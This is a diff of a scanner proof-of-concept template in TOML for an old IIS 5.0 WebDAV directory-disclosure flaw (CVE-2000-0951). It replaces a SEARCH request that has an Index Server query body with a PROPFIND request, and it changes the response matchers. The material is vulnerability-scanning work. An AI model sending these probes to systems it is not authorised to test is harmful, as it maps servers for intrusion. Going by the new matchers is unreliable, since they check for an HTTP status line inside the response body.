@@ -1,9 +1,9 @@
 [info]
 author = "ave"
-description = "向 IIS 5.0 服务器发送 WebDAV SEARCH 请求，利用 Index Server 的搜索功能遍历 Web 根目录下的文件与子目录列表。若响应包含目录名或文件列表，则目标存在漏洞。"
+description = "检测 IIS 5.0 中是否启用了 Index Server 和 Index 属性，通过发送 WebDAV PROPFIND 请求来列出 Web 根目录文件和文件夹"
 id = "POC-AVE-2000-0693"
-name = "Microsoft IIS 5.0 WebDAV 搜索目录泄露漏洞 PoC"
-severity = "medium"
+name = "CVE-2000-0951 IIS 5.0 Directory Disclosure PoC"
+severity = "high"
 tags = ["ave-2000-0693"]
 vuln_id = [
     "CVE-2000-0951",
@@ -11,32 +11,22 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
-method = "SEARCH"
-path = "/{{BaseURL}}/"
+method = "PROPFIND"
+path = "/{{BaseURL}}/HTTP/"
 protocol = "http"
 
-[poc.requests.body]
-content = """
-<?xml version="1.0"?>
-<g:searchrequest xmlns:g="DAV:">
-<g:sql>
-Select "DAV:displayname" from scope()
-</g:sql>
-</g:searchrequest>"""
-type = "raw"
-
 [poc.requests.headers]
-Content-Type = "text/xml"
+Depth = "1"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "207 Multi-Status",
-    "displayname",
-    "href",
+    "Directory Listing",
+    "HTTP/1.0 200 OK",
 ]
